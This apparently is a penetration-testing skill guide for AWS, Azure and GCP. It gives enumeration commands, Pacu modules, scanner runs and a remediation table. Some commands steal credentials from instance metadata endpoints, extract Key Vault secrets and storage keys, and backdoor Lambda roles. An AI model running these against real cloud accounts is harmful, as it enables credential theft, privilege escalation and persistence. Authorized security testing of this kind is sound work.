---
name: conducting-cloud-infrastructure-penetration-test
description: Perform a cloud infrastructure penetration test across AWS, Azure, and GCP to identify IAM misconfigurations, exposed storage buckets, insecure serverless functions, and cloud-native attack paths using Pacu, ScoutSuite, and Prowler.
domain: cybersecurity
subdomain: penetration-testing
tags: [cloud-pentest, AWS, Azure, GCP, Pacu, ScoutSuite, Prowler, IAM, S3, cloud-security]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Conducting Cloud Infrastructure Penetration Test

## Overview

Cloud infrastructure penetration testing identifies security weaknesses in AWS, Azure, and GCP environments by targeting IAM policies, storage configurations, compute instances, serverless functions, network controls, and Kubernetes clusters. Cloud-specific attack vectors include over-privileged IAM roles, misconfigured storage buckets, exposed metadata services, insecure API endpoints, and lateral movement through cloud service chains.

## Prerequisites

- Written authorization and cloud provider notification (AWS penetration testing policy, Azure rules, GCP terms)
- Cloud credentials with read-only access (assumed breach model) or unauthenticated external testing
- Tools: Pacu (AWS), ScoutSuite, Prowler, AzureHound, GCPBucketBrute, CloudMapper
- Understanding of shared responsibility model for each provider

## AWS Penetration Testing

### Initial Enumeration

```bash
# Verify caller identity
aws sts get-caller-identity

# Enumerate IAM permissions
aws iam get-user
aws iam list-attached-user-policies --user-name testuser
aws iam list-user-policies --user-name testuser

# Enumerate all IAM users and roles
aws iam list-users
aws iam list-roles
aws iam list-groups

# Enumerate EC2 instances
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,PublicIpAddress,PrivateIpAddress]' --output table

# Enumerate S3 buckets
aws s3 ls
aws s3 ls s3://target-bucket --recursive

# Enumerate Lambda functions
aws lambda list-functions --query 'Functions[*].[FunctionName,Runtime,Role]' --output table

# Enumerate RDS databases
aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,Engine,PubliclyAccessible]' --output table

# Enumerate secrets
aws secretsmanager list-secrets
aws ssm describe-parameters
```

### Pacu Exploitation Framework

```bash
# Install and configure Pacu
pip install pacu
pacu

# Import AWS keys
Pacu> set_keys
Pacu> import_keys testuser

# Run enumeration modules
Pacu> run iam__enum_permissions
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run ec2__enum
Pacu> run s3__enum
Pacu> run lambda__enum

# Privilege escalation checks
Pacu> run iam__privesc_scan

# Exploit S3 bucket misconfigurations
Pacu> run s3__bucket_finder

# EC2 metadata SSRF exploitation
Pacu> run ec2__metadata_services

# Lambda backdoor (authorized testing)
Pacu> run lambda__backdoor_new_roles
```

### S3 Bucket Testing

```bash
# Test for public buckets
aws s3 ls s3://target-corp-backup --no-sign-request
aws s3 cp s3://target-corp-backup/test.txt /tmp/ --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-corp-backup
aws s3api get-bucket-acl --bucket target-corp-backup

# Test for ACL misconfigurations
aws s3api put-object --bucket target-corp-backup --key pentest_proof.txt \
  --body /tmp/proof.txt
```

### EC2 Instance Metadata Exploitation

```bash
# From a compromised EC2 instance:
# IMDSv1 (if not disabled)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name

# Extract temporary credentials
# Use them to enumerate further permissions
export AWS_ACCESS_KEY_ID=<from_metadata>
export AWS_SECRET_ACCESS_KEY=<from_metadata>
export AWS_SESSION_TOKEN=<from_metadata>
aws sts get-caller-identity
```

## Azure Penetration Testing

### Azure Enumeration

```bash
# Login with test credentials
az login -u testuser@target.onmicrosoft.com -p 'Password123'

# Enumerate subscriptions
az account list --output table

# Enumerate resource groups
az group list --output table

# Enumerate VMs
az vm list --output table

# Enumerate storage accounts
az storage account list --output table

# Enumerate App Services
az webapp list --output table

# Enumerate Key Vaults
az keyvault list --output table

# Enumerate Azure AD users
az ad user list --output table

# AzureHound for attack paths (like BloodHound for Azure)
azurehound list -u testuser@target.onmicrosoft.com -p 'Password123' -o azurehound.json
```

### Azure-Specific Attacks

```bash
# Enumerate Managed Identity from compromised VM
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Storage account key extraction
az storage account keys list --resource-group RG-Production --account-name targetstorageacct

# Key Vault secret extraction
az keyvault secret list --vault-name target-keyvault
az keyvault secret show --vault-name target-keyvault --name admin-password

# Stormspotter — Azure attack graph
python stormspotter.py --cli
```

## GCP Penetration Testing

### GCP Enumeration

```bash
# Authenticate
gcloud auth login

# List projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list

# Enumerate storage buckets
gsutil ls
gsutil ls gs://target-bucket/

# Enumerate IAM policies
gcloud projects get-iam-policy PROJECT_ID

# Enumerate Cloud Functions
gcloud functions list

# Enumerate service accounts
gcloud iam service-accounts list

# Check for public buckets
gsutil ls -L gs://target-bucket/ | grep "Access control"
```

## Cross-Cloud Security Assessment

### ScoutSuite Multi-Cloud Audit

```bash
# AWS audit
scout suite aws --profile testuser

# Azure audit
scout suite azure --cli

# GCP audit
scout suite gcp --user-account

# Review results in HTML dashboard
# Focus on: IAM, storage, networking, logging findings
```

### Prowler (AWS CIS Benchmark)

```bash
# Run full CIS benchmark scan
prowler aws --profile testuser

# Run specific checks
prowler aws -c check11 check12 check13  # IAM checks
prowler aws -g s3  # S3 group
prowler aws -g forensics-ready  # Logging checks

# Export results
prowler aws -M json-ocsf -o ./prowler_results/
```

## Findings Matrix

| Finding | Cloud | Severity | Remediation |
|---------|-------|----------|-------------|
| Public S3 bucket with PII | AWS | Critical | Enable bucket policy deny public access |
| Over-privileged IAM role on Lambda | AWS | High | Implement least-privilege IAM policies |
| IMDSv1 enabled on EC2 | AWS | High | Enforce IMDSv2 across all instances |
| Storage account with public blob access | Azure | Critical | Disable anonymous blob access |
| Key Vault accessible by all users | Azure | High | Restrict Key Vault access policies |
| GCS bucket with allUsers read | GCP | Critical | Remove allUsers permission |
| Service account key exposed in repo | GCP | Critical | Rotate key, enable Workload Identity |

## References

- Pacu: https://github.com/RhinoSecurityLabs/pacu
- ScoutSuite: https://github.com/nccgroup/ScoutSuite
- Prowler: https://github.com/prowler-cloud/prowler
- AzureHound: https://github.com/BloodHoundAD/AzureHound
- AWS Penetration Testing Policy: https://aws.amazon.com/security/penetration-testing/
- HackTricks Cloud: https://cloud.hacktricks.wiki/
